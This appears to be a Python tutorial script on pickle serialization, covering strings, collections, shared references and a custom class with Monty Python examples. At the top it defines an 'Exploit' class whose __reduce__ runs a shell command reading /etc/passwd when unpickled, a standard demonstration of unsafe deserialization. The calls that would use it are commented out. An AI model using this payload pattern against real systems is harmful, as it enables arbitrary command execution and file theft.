import os
import pickle

class Exploit():
    def __reduce__(self):
        return (os.system, ("cat /etc/passwd > exploit.txt && curl www.google.com >> exploit.txt",))

def serialize_exploit(fname):
    with open(fname, "wb") as f:
        pickle.dump(Exploit(), f)

# serialize_exploit('loadme')

import pickle
# pickle.loads(open('loadme', 'rb').read())

ser = pickle.dumps('Python Pickel Peppers')
print(ser)

deser = pickle.loads(ser)
print(deser)

# integers
ser = pickle.dumps(3.14)
print(ser)
loads = pickle.loads(ser)
print(loads)

# Tuples
d  = [10,20,('a','b',30)]
ser = pickle.dumps(d)
print(ser)
deser = pickle.loads(ser)
print(deser)

print(id(d))
print(id(ser))
print(id(deser))

print(d == deser)
print(d == ser)

# Set
s = {'a','b','x',10}
ser = pickle.dumps(s)
print(ser)
deser = pickle.loads(ser)
print(deser)
print(s == deser)
print(s == ser)

# dictionary
from datetime import datetime
d = {
    'a':100,
    'b':(1,2,3),
    'c': [1,2,3],
    'd':{'d':1+1j,'y':datetime.now()},
}

ser = pickle.dumps(d)
print(ser)
deser = pickle.loads(ser)
print(deser)
print(d == deser)
print(d == ser)
print(id(ser))
print(id(deser))

# shared references maintaind
d1 = {'a':10, 'b':20}
d2 = {'a':100, 'y':d1}
ser = pickle.dumps(d2)
d3 = pickle.loads(ser)

print(d2['y'] == d3['y'])
print(d2['y'] is d3['y'])


d1 = {'a':10, 'b':20}
d2 = {'x':100, 'y':d1, 'z':d1}
print(d2['y'] == d2['z'])

ser = pickle.dumps(d2)
deser = pickle.loads(ser)
print(deser)
print(deser['y'] == deser['z'])
print(deser['y'] is deser['z'])

# Caveat
d1 = {'a':10, 'b':20}
d2 = {'x':100, 'y':d1}

d1_ser = pickle.dumps(d1)
d2_ser = pickle.dumps(d2)

del d1
del d2
d1 = pickle.loads(d1_ser)
d2 = pickle.loads(d2_ser)

print(d1)
print(d2)
d1['c']=3
print(d2)

# more complex dictionary

class Person:
    def __init__(self, name, age):
        self.name = name
        self.age = age

    def __eq__(self, other):
        return self.name == other.name and self.age == other.age

    def __repr__(self):
        return f'Person(name={self.name}, age={self.age})'


john = Person('John Cleese', 79)
eric = Person('Eric Idel', 75)
michael = Person('Michael Palin', 75)

parrot_sketch = {
    'title':'Parrot Sketch',
    'actors': [john, michael]
}

ministry_sketch = {
    'title':'Ministry Sketch',
    'actors': [john, michael]
}

joke_sketch = {
    'title':'Funniest Joke in the world',
    'actors': [eric, michael]
}

fan_favorite = {
    'user_1' : [parrot_sketch, joke_sketch],
    'user_2' : [parrot_sketch, ministry_sketch]
}

from pprint import pprint

pprint(fan_favorite)
parrot_sketch_id = id(parrot_sketch)
ser = pickle.dumps(fan_favorite)
new_fan_favorite = pickle.loads(ser)
pprint(new_fan_favorite)

print(new_fan_favorite == fan_favorite)

print(id(fan_favorite['user_1'][0]),id(fan_favorite['user_2'][0]))
print(id(new_fan_favorite['user_1'][0]),id(new_fan_favorite['user_2'][0]))
print(parrot_sketch_id)